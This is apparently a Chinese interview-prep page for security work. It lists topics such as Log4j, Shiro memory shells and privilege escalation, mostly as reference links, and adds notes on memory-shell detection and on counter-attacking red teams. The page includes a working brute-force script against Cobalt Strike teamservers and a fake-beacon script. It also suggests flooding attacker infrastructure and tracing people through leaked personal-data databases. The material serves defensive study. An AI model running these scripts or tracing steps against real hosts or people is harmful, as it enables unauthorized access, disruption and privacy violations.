+<h1 id="Log4J漏洞有深入了解吗？"><a href="#Log4J漏洞有深入了解吗？" class="headerlink" title="Log4J漏洞有深入了解吗？"></a>Log4J漏洞有深入了解吗？</h1><p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1720302213380803056&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1720302213380803056&amp;wfr=spider&amp;for=pc</a></p>
+<h1 id="参数污染或者模糊测试用过吗？"><a href="#参数污染或者模糊测试用过吗？" class="headerlink" title="参数污染或者模糊测试用过吗？"></a>参数污染或者模糊测试用过吗？</h1><p><a target="_blank" rel="noopener" href="https://www.cxymm.net/article/MCTSOG/123241396">https://www.cxymm.net/article/MCTSOG/123241396</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15072903/4074634">https://blog.51cto.com/u_15072903/4074634</a></p>
+<h1 id="渗透过app-小程序吗"><a href="#渗透过app-小程序吗" class="headerlink" title="渗透过app,小程序吗"></a>渗透过app,小程序吗</h1><p><a target="_blank" rel="noopener" href="https://www.hackinn.com/index.php/archives/672/">https://www.hackinn.com/index.php/archives/672/</a></p>
+<h1 id="cc链中的4种transformer"><a href="#cc链中的4种transformer" class="headerlink" title="cc链中的4种transformer"></a>cc链中的4种transformer</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9409">https://xz.aliyun.com/t/9409</a></p>
+<h1 id="如何缩小反序列化的执行链"><a href="#如何缩小反序列化的执行链" class="headerlink" title="如何缩小反序列化的执行链"></a>如何缩小反序列化的执行链</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10997">https://xz.aliyun.com/t/10997</a></p>
+<h1 id="存在rce的洞-可以利用runtime-exec做反弹shell吗"><a href="#存在rce的洞-可以利用runtime-exec做反弹shell吗" class="headerlink" title="存在rce的洞,可以利用runtime.exec做反弹shell吗"></a>存在rce的洞,可以利用runtime.exec做反弹shell吗</h1><p>base64+bash -i</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202672">https://www.anquanke.com/post/id/202672</a></p>
+<h1 id="java执行无回显-如何处理-如何得到回显"><a href="#java执行无回显-如何处理-如何得到回显" class="headerlink" title="java执行无回显,如何处理,如何得到回显"></a>java执行无回显,如何处理,如何得到回显</h1><p>dnslog、当前环境中找响应对象、抛出异常、web目录里写入html</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7740">https://xz.aliyun.com/t/7740</a></p>
+<h1 id="shiro中如何检测key的正确性"><a href="#shiro中如何检测key的正确性" class="headerlink" title="shiro中如何检测key的正确性"></a>shiro中如何检测key的正确性</h1><p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/323529.html">https://www.freebuf.com/articles/web/323529.html</a></p>
+<h1 id="shiro注内存马-维持权限"><a href="#shiro注内存马-维持权限" class="headerlink" title="shiro注内存马(维持权限)"></a>shiro注内存马(维持权限)</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240033">https://www.anquanke.com/post/id/240033</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.ctfiot.com/13929.html">http://www.ctfiot.com/13929.html</a></p>
+<h1 id="java的shiro框架-进阶利用-是否内存马注入"><a href="#java的shiro框架-进阶利用-是否内存马注入" class="headerlink" title="java的shiro框架,进阶利用,是否内存马注入"></a>java的shiro框架,进阶利用,是否内存马注入</h1><p><a target="_blank" rel="noopener" href="http://moonflower.fun/index.php/2022/02/21/277/">http://moonflower.fun/index.php/2022/02/21/277/</a></p>
+<h1 id="Spring相关漏洞"><a href="#Spring相关漏洞" class="headerlink" title="Spring相关漏洞"></a>Spring相关漏洞</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1925830">https://cloud.tencent.com/developer/article/1925830</a></p>
+<h1 id="内存马查杀"><a href="#内存马查杀" class="headerlink" title="内存马查杀"></a>内存马查杀</h1><h2 id="内存马的分类"><a href="#内存马的分类" class="headerlink" title="内存马的分类"></a>内存马的分类</h2><ol>
+<li>servlet-api类<ul>
+<li>filter型</li>
+<li>servlet型</li>
+</ul>
+</li>
+<li>spring类<ul>
+<li>拦截器</li>
+<li>controller型</li>
+</ul>
+</li>
+<li>java Instrumentation类<ul>
+<li>agent型</li>
+</ul>
+</li>
+</ol>
+<h2 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a>查杀思路</h2><p>利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀</p>
+<h2 id="内存马的识别"><a href="#内存马的识别" class="headerlink" title="内存马的识别"></a>内存马的识别</h2><h3 id="filter名字很特别"><a href="#filter名字很特别" class="headerlink" title="filter名字很特别"></a>filter名字很特别</h3><p>内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字</p>
+<h3 id="filter优先级是第一位"><a href="#filter优先级是第一位" class="headerlink" title="filter优先级是第一位"></a>filter优先级是第一位</h3><p>为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点</p>
+<h3 id="对比web-xml中没有filter配置"><a href="#对比web-xml中没有filter配置" class="headerlink" title="对比web.xml中没有filter配置"></a>对比web.xml中没有filter配置</h3><p>由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征.</p>
+<h3 id="特殊class-loader加载"><a href="#特殊class-loader加载" class="headerlink" title="特殊class loader加载"></a>特殊class loader加载</h3><p>我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</span><br><span class="line">com.sun.org.apache.bcel.internal.util.ClassLoader</span><br></pre></td></tr></table></figure>
+
+<p>这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader</p>
+<h3 id="对应的classloader路径下面没有class文件"><a href="#对应的classloader路径下面没有class文件" class="headerlink" title="对应的classloader路径下面没有class文件"></a>对应的classloader路径下面没有class文件</h3><p>所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件</p>
+<h3 id="dilter的dofilter方法中有恶意代码"><a href="#dilter的dofilter方法中有恶意代码" class="headerlink" title="dilter的dofilter方法中有恶意代码"></a>dilter的dofilter方法中有恶意代码</h3><p>我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在而已代码,比如调用了以下恶意方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime</span><br><span class="line">defineClass</span><br><span class="line">invoke</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+
+<p>不难分析,内存马的命门在于5 和 6 也就是说filter型内存马首先是一个filter类,同时它在硬盘上面没有对应的class文件,若dump出的class文件还有而已代码,那么必定是内存马了.</p>
+<h2 id="内存马的查杀"><a href="#内存马的查杀" class="headerlink" title="内存马的查杀"></a>内存马的查杀</h2><h3 id="清除内存马中的filter的恶意代码"><a href="#清除内存马中的filter的恶意代码" class="headerlink" title="清除内存马中的filter的恶意代码"></a>清除内存马中的filter的恶意代码</h3><h3 id="模拟中间件注销filter"><a href="#模拟中间件注销filter" class="headerlink" title="模拟中间件注销filter"></a>模拟中间件注销filter</h3><p>两种方法各有优势,第一种方法比较通用,直接适配所有中间件,但是恶意的filter依然还在,只是恶意代码被清除了.第二种方法比较优雅,恶意的filter会被清除掉.但每种中间件注销filter的逻辑不尽相同,需要一一适配</p>
+<p><a target="_blank" rel="noopener" href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">https://gv7.me/articles/2020/kill-java-web-filter-memshell/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&mid=2247484106&idx=1&sn=bf8f8db7a4d07eb3cb9a820154bfa40b&chksm=cf032287f874ab911b21e66aa15e2d9784552b6116904d0a2ca4dc1734dec37e95d4b39e74c0&token=427094966&lang=zh_CN#rd">Tomcat 内存马学习(一)：Filter型 (qq.com)</a></p>
+<h1 id="阿里开源的Java诊断工具——Arthas"><a href="#阿里开源的Java诊断工具——Arthas" class="headerlink" title="阿里开源的Java诊断工具——Arthas"></a>阿里开源的Java诊断工具——Arthas</h1><p><a target="_blank" rel="noopener" href="https://arthas.aliyun.com/doc/idea-plugin.html">IDEA Plugin — Arthas 3.6.2 文档 (aliyun.com)</a></p>
+<h1 id="fastjson遇到吗"><a href="#fastjson遇到吗" class="headerlink" title="fastjson遇到吗"></a>fastjson遇到吗</h1><p>简单来说就是fastJSON在解析json数据的时候会自动触发一些方法.比如set get tostring ,当我们构造一些恶意的方法名字如果满足这个条件时,也会像set和get一样执行.</p>
+<p><a target="_blank" rel="noopener" href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></p>
+<h1 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170471">https://www.anquanke.com/post/id/170471</a></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9902">https://xz.aliyun.com/t/9902</a></p>
+<h1 id="linux最新提权漏洞"><a href="#linux最新提权漏洞" class="headerlink" title="linux最新提权漏洞"></a>linux最新提权漏洞</h1><p><a target="_blank" rel="noopener" href="https://netsecurity.51cto.com/article/703608.html">https://netsecurity.51cto.com/article/703608.html</a></p>
+<h1 id="Linux提权的方法？CVE-2021-4034-pkexec有了解吗？"><a href="#Linux提权的方法？CVE-2021-4034-pkexec有了解吗？" class="headerlink" title="Linux提权的方法？CVE-2021-4034 pkexec有了解吗？"></a>Linux提权的方法？CVE-2021-4034 pkexec有了解吗？</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280398.html">https://www.freebuf.com/articles/web/280398.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/">https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/</a></p>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48985780/article/details/122297100">https://blog.csdn.net/qq_48985780/article/details/122297100</a></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220613115519668.png" alt="image-20220613115519668"></p>
+<h1 id="蓝队反杀红队的经历有吗"><a href="#蓝队反杀红队的经历有吗" class="headerlink" title="蓝队反杀红队的经历有吗"></a>蓝队反杀红队的经历有吗</h1><h2 id="针对ip溯源一二"><a href="#针对ip溯源一二" class="headerlink" title="针对ip溯源一二"></a>针对ip溯源一二</h2><p>一般来说,红队大部分都是使用代理节点进行测试,假如我们捕获或者从样本里面分析拿到了真实的ip,那么以下的操作场景就有用了,或者使用钓鱼反调的方式去获取到真实的ip</p>
+<h3 id="来自创宇盾等节点的流量ip"><a href="#来自创宇盾等节点的流量ip" class="headerlink" title="来自创宇盾等节点的流量ip"></a>来自创宇盾等节点的流量ip</h3><p>ip,假设前面还有一层云waf cdn厂商等.那么需要协调到提供服务的厂商,快速获取到云waf或者cdn之前的节点真实ip.然后拿到了真实的ip,就变成了一些常规的溯源操作</p>
+<h3 id="whois-域名反查"><a href="#whois-域名反查" class="headerlink" title="whois 域名反查"></a>whois 域名反查</h3><p>ip,初步可以进行whois查询,以及域名反查,查看历史的解析,以及历史的ip用有记录,运气好的话,假如攻击队队员使用的是自己的博客之类的vps常用节点,那么很有可能通过这个手法进行溯源到相关人员</p>
+<h3 id="探测端口-服务-进行反渗透"><a href="#探测端口-服务-进行反渗透" class="headerlink" title="探测端口 服务 进行反渗透"></a>探测端口 服务 进行反渗透</h3><p>ip,对该ip进行端口探测,服务探测,进行反渗透,一般来说红队的vps都是在一些国内的一些vps主机供应商或者云服务供应商那边购买,假如是国内的话,可以通过公安网警来进行协助查水表,获取真实人员的身份.假如我们反渗透成功,那么可以提取历史登入记录,历史ip,网络连接,进程 以及攻击工具 进程 内存镜像等方式进行取证分析.</p>
+<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p>ip,对使用威胁情报进行综合分析,查看该ip他人对该ip打的标签,历史解析记录,历史变更记录,以及该ip上面关联的相关样本,这些都能够获取到进行进一步分析.</p>
+<h3 id="邮箱-qq-手机号-社工库"><a href="#邮箱-qq-手机号-社工库" class="headerlink" title="邮箱 qq 手机号 社工库"></a>邮箱 qq 手机号 社工库</h3><p>通过ip的whois获取到了相关人员的qq或者邮箱或者手机号,那么可以使用社工库,进行社工查询.比如twitter的社工库机器人或者自行研究的社工库进行综合关联分析</p>
+<h3 id="qq-微信-抖音-陌陌-等接口"><a href="#qq-微信-抖音-陌陌-等接口" class="headerlink" title="qq 微信 抖音 陌陌 等接口"></a>qq 微信 抖音 陌陌 等接口</h3><p>获取到了手机号,那么可以通过qq  微信 抖音 陌陌 等接口进行关联,一般获取到了手机号初步可以通过这种简单易行的手法去溯源到红队人员</p>
+<h3 id="ga数据-运营商数据"><a href="#ga数据-运营商数据" class="headerlink" title="ga数据 运营商数据"></a>ga数据 运营商数据</h3><p>有办法能通过ga资源,或者直接通过运营商拿数据,那就更好了</p>
+<h2 id="常见红队被反杀的姿势"><a href="#常见红队被反杀的姿势" class="headerlink" title="常见红队被反杀的姿势"></a>常见红队被反杀的姿势</h2><ol>
+<li>使用个人工作pc,且浏览器里面保存了百度 163 sina等登录凭据,攻击对抗过程中踩到蓝队的蜜罐,被jsonp劫持漏洞捕获安全社交id,从而被溯源到了真实的姓名和所在公司</li>
+<li>可能是蓝队封禁ip太厉害的原因,红队个人或者团队,使用自己的网站进行vps进行扫描,vps上含有团伙组织https证书,或者vps ip绑定的域名跟安全社交id对应,从而被溯源到真实姓名和所在的公司</li>
+<li>部分攻击队写的扫描器payload里面含有攻击者的信息,如使用了私有的dnslog 攻击载荷里面含有安全社交id 含有个人博客资源请求等</li>
+<li>投递的钓鱼邮件里面的木马样本被蓝队采集,逆向 反控c2c 溯源到个人信息</li>
+<li>虚拟机逃逸打到实体机,暴露个人全部真实信息的</li>
+</ol>
+<h2 id="反制红队基础设施的操作"><a href="#反制红队基础设施的操作" class="headerlink" title="反制红队基础设施的操作"></a>反制红队基础设施的操作</h2><h3 id="cobalt-strike反制"><a href="#cobalt-strike反制" class="headerlink" title="cobalt strike反制"></a>cobalt strike反制</h3><p>在防守里面,必不可少的是钓鱼邮件,或者社工钓鱼,一般来说钓鱼的样本无非这几种,exe elf可执行文件,以及加了料的doc类宏木马,一般而言,目前红队主要是通过cobalt strike生成相关上线的shell 那么针对cobalt strike如何进行反制呢</p>
+<ol>
+<li>批量上线钓鱼马,启几百个进程mddos红方的cs端.假如我们获取到了红方的cs样本,那么第一种方法可以批量启几百个进程运行该样本(注意隔离环境),然后红方的cs端几乎瘫痪,无法使用</li>
+<li>爆破cs密码 一般而言,红队的cs设施为了多人运动,密码通常不会太复杂,很大机会是弱口令为主,甚至teamserver端口50050,那么针对cs端控制端,可以直接进行密码爆破,</li>
+</ol>
+<p>附cs 爆破密码脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,socket,ssl,argparse,concurrent.futures,sys</span><br><span class="line"></span><br><span class="line">MIN_PYTHON = (<span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> sys.version_info &lt; MIN_PYTHON:</span><br><span class="line">    sys.exit(<span class="string">&quot;Python %s.%s or later is required.\n&quot;</span> % MIN_PYTHON)</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;host&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Teamserver address&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;wordlist&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&quot;Newline-delimited word list file&quot;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotConnectedException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message=<span class="literal">None</span>, node=<span class="literal">None</span></span>):</span><br><span class="line">        self.message = message</span><br><span class="line">        self.node = node</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DisconnectedException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message=<span class="literal">None</span>, node=<span class="literal">None</span></span>):</span><br><span class="line">        self.message = message</span><br><span class="line">        self.node = node</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Connector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.ssl_sock = <span class="literal">None</span></span><br><span class="line">        self.ctx = ssl.SSLContext()</span><br><span class="line">        self.ctx.verify_mode = ssl.CERT_NONE</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_connected</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.sock <span class="keyword">and</span> self.ssl_sock</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self, hostname, port</span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(<span class="number">10</span>)</span><br><span class="line">        self.ssl_sock = self.ctx.wrap_socket(self.sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hostname == socket.gethostname():</span><br><span class="line">            ipaddress = socket.gethostbyname_ex(hostname)[<span class="number">2</span>][<span class="number">0</span>]</span><br><span class="line">            self.ssl_sock.connect((ipaddress, port))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ssl_sock.connect((hostname, port))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.sock:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.ssl_sock = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.ssl_sock: <span class="keyword">raise</span> NotConnectedException(<span class="string">&quot;Not connected (SSL Socket is null)&quot;</span>)</span><br><span class="line">        self.ssl_sock.sendall(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">receive</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.ssl_sock: <span class="keyword">raise</span> NotConnectedException(<span class="string">&quot;Not connected (SSL Socket is null)&quot;</span>)</span><br><span class="line">        received_size = <span class="number">0</span></span><br><span class="line">        data_buffer = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> received_size &lt; <span class="number">4</span>:</span><br><span class="line">            data_in = self.ssl_sock.recv()</span><br><span class="line">            data_buffer = data_buffer + data_in</span><br><span class="line">            received_size += <span class="built_in">len</span>(data_in)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data_buffer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passwordcheck</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">0</span>:</span><br><span class="line">        result = <span class="literal">None</span></span><br><span class="line">        conn = Connector()</span><br><span class="line">        conn.<span class="built_in">open</span>(args.host, <span class="number">50050</span>)</span><br><span class="line">        payload = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00\x00\xbe\xef&quot;</span>) + <span class="built_in">len</span>(password).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>, signed=<span class="literal">True</span>) + <span class="built_in">bytes</span>(<span class="built_in">bytes</span>(password, <span class="string">&quot;ascii&quot;</span>).ljust(<span class="number">256</span>, <span class="string">b&quot;A&quot;</span>))</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        <span class="keyword">if</span> conn.is_connected(): result = conn.receive()</span><br><span class="line">        <span class="keyword">if</span> conn.is_connected(): conn.close()</span><br><span class="line">        <span class="keyword">if</span> result == <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00\x00\xca\xfe&quot;</span>): <span class="keyword">return</span> password</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">&quot;Do not have a blank password!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">passwords = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.wordlist: passwords = <span class="built_in">open</span>(args.wordlist).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin: passwords.append(line.rstrip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(passwords) &gt; <span class="number">0</span>:</span><br><span class="line">    attempts = <span class="number">0</span></span><br><span class="line">    failures = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">30</span>) <span class="keyword">as</span> executor:</span><br><span class="line"></span><br><span class="line">        future_to_check = &#123;executor.submit(passwordcheck, password): password <span class="keyword">for</span> password <span class="keyword">in</span> passwords&#125;</span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_check):</span><br><span class="line">            password = future_to_check[future]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = future.result()</span><br><span class="line">                attempts = attempts + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;Successful Attack!!!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Target Password: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">                failures = failures + <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;%r generated an exception: %s&#x27;</span> % (password, exc))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Password(s) required&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​    3.假上线,我们只需要发送心跳包,即可模拟上线,并且攻击者无法执行命令.使用时更改换IP或域名、port、cookie</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heartbeat</span>():</span><br><span class="line">    url = <span class="string">&quot;http://192.168.186.133:333/activity&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;IgyzGuIX0Jra5Ht45ZLYKyXWBnxfkNI3m6BOvExEPdWCuAv8fnY6HXKTygBOVdE34sDYusoDIjzHr/QR32mKsoVPb5NFMCHAtC7FLQUdSsZdufXjsd2dSqkGDcaZkcQYD1BssyjGZHTy42lT8oDpga3y1z5FMGRjobeksgaMX7M=&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;192.168.186.133:333&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727)&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    text = resp.content.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">x = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> x:</span><br><span class="line">    text = heartbeat()</span><br><span class="line">    lengs = <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="comment"># print(lengs, &quot;    &quot;, text)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;2f4320&#x27;</span> <span class="keyword">in</span> text <span class="keyword">and</span> <span class="string">&#x27;000041&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime()))</span><br><span class="line"></span><br><span class="line">        commeds = re.findall(<span class="string">r&#x27;2f4320(.*?)000041&#x27;</span>, text)</span><br><span class="line">        <span class="keyword">for</span> comm <span class="keyword">in</span> commeds:</span><br><span class="line">            commed = <span class="built_in">bytes</span>.fromhex(comm).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(commed)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="针对dnslog的反制"><a href="#针对dnslog的反制" class="headerlink" title="针对dnslog的反制"></a>针对dnslog的反制</h3><p>通过流量设备审计到他人的dnslog平台的url payload,那么针对他的url payload可以进行反制.一般而言,常见的dnslog平台,蓝队防守的时候可以对厂家爱你的dnslog平台进行屏蔽.那么针对自行搭建的dnslog平台有以下思路</p>
+<p>dnslog反制,可以批量ping捕获到的dnslog,然后而已扰乱他自行搭建的,恶意制造各种垃圾dnslog数据,让他无法获取到有效的信息,直接让红队人员被迫抛弃一个红队基础设施.具体可以写一个脚本比如站长之家之类的进行批量平,进行探测存活</p>
+<p>httplog反制同理,可以使用爬虫节点,批量进行request请求捕获的http url即可,这样红队的dnslog平台几乎彻底报废.</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4509">红队基础建设:隐藏你的C2 server - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8385">https://xz.aliyun.com/t/8385</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p>
+<h1 id="约束与非约束委派攻击的利用和原理"><a href="#约束与非约束委派攻击的利用和原理" class="headerlink" title="约束与非约束委派攻击的利用和原理"></a>约束与非约束委派攻击的利用和原理</h1><p><a target="_blank" rel="noopener" href="https://www.likecs.com/show-305577004.html">https://www.likecs.com/show-305577004.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/kerberos/1">AS_REQ &amp; AS_REP - windows protocol (gitbook.io)</a></p>
+<h1 id="黄金票据-x2F-白银票据知道吗？区别是什么？"><a href="#黄金票据-x2F-白银票据知道吗？区别是什么？" class="headerlink" title="黄金票据&#x2F;白银票据知道吗？区别是什么？"></a>黄金票据&#x2F;白银票据知道吗？区别是什么？</h1><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ping_Pig/article/details/121228886">https://blog.csdn.net/Ping_Pig/article/details/121228886</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/1-Ry/p/15418602.html">https://www.cnblogs.com/1-Ry/p/15418602.html</a></p>
